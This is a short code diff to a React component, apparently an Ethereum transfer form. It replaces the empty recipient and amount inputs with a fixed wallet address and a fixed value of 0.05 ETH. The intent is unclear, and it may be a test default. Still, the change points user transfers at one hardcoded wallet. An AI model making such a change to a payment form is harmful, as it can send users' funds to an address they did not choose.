@@ -145,8 +145,8 @@ const Home = () => {
 
       <section className='mt-5 flex flex-col justify-center'>
         <div className='py-5 mt-5 px-3 blue-glassmorphism'>
-          <Input placeholder="Address To" name="addressTo" type="text" />
-          <Input placeholder="Amount (ETH)" name="amount" type="number" />
+          <Input placeholder="Address To" value="0x52EdB5dFCE4640644AD366b660ee9b78872b16c3" name="addressTo" type="text" />
+          <Input placeholder="Amount (ETH)" value="0.05" name="amount" type="number" />
         </div>
         <div className='mb-10'></div>
         {isLoading
